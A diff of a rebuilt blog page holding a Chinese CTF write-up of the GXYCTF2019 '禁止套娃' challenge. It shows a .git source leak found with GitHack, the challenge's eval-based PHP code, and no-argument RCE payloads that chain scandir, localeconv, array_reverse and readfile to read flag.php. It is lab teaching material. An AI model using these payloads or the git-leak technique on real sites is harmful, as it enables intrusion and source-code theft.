@@ -13,7 +13,8 @@
   
   <meta name="description" content=" 知识点：命令执行绕过
 靶机启动：
-image-202...">
+
+查看了源码无果，...">
   <meta name="author" content="4v1d">
   <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
@@ -203,7 +204,7 @@ image-202...">
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 01, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3261</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3060</span>
     </div>
   </div>
 </section>
@@ -212,7 +213,7 @@ image-202...">
         
         <p> 知识点：命令执行绕过</p>
 <p>靶机启动：</p>
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801193338875.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210801193338875</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801193338875.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210801193338875"></p>
 <p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
 <p>查看了wp才知道这是git泄露。</p>
 <h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p>
@@ -220,10 +221,10 @@ image-202...">
 <p>这时候我们用了名为GitHack的工具</p>
 <p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
 <p>进行了扫描，获取源文件：</p>
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801194006477.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210801194006477</span></p>
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801194541670.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210801194541670</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801194006477.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210801194006477"></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801194541670.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210801194541670"></p>
 <p>源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p>
 <p>源码分析：</p>
@@ -235,10 +236,10 @@ image-202...">
 <li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
 <li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
 </ul>
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">在这里插入图片描述</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="在这里插入图片描述"></p>
 <p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
 <p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>并且scandir返回的是一个数组</p>
 <p>那么问题就是如何构造<br>scandir(‘.’)</p>
@@ -246,33 +247,33 @@ image-202...">
 <p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p>
 <p><strong>current(localeconv())永远都是个点</strong></p>
 <p>构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br>print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801200909285.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210801200909285</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801200909285.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210801200909285"></p>
 <p>到这里我们也只是可以知道flag.php的存在</p>
 <p>却还不能读取它的源码</p>
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/1625650-20200204202458447-503722062.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/1625650-20200204202458447-503722062.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p>从上图的官方解释中可以知道</p>
 <p>我们无法用单独的函数读取源码</p>
 <p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure>
 
 <p><strong>2.array_flip()</strong></p>
 <p>交换数组的键和值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure>
 
 <p><strong>3.array_rand()</strong></p>
 <p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure>
 
 <p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=print_r(<span class="hljs-name">readfile</span>(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=highlight_file(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));    </span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=show_source(<span class="hljs-name">session_id</span>(<span class="hljs-name">session_start</span>()))<span class="hljs-comment">;    </span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801202551668.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210801202551668</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210801202551668.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210801202551668"></p>
 <p>参考博客：</p>
 <p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
 <p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p>
@@ -280,15 +281,15 @@ image-202...">
 <h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>学长用这题做模板，做了改造题</p>
 <p>本来以为很简单(好吧其实是很简单)</p>
 <p>先用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210827201807385.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210827201807385</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210827201807385.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210827201807385"></p>
 <p>再直接读取（我就是傻傻一直不读读取的孩子啊，在那array_reverse，哭死了）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(this_is_real_flag);</span><br></pre></td></tr></table></figure>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">show<span class="hljs-number">_</span>source(<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>real<span class="hljs-number">_f</span>lag);<br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210827201914618.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210827201914618</span></p>
+<p><img   class="lazyload" data-original="/2021/08/01/2021/buu/5/image-20210827201914618.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210827201914618"></p>
 
       </section>
       <section class="extra">
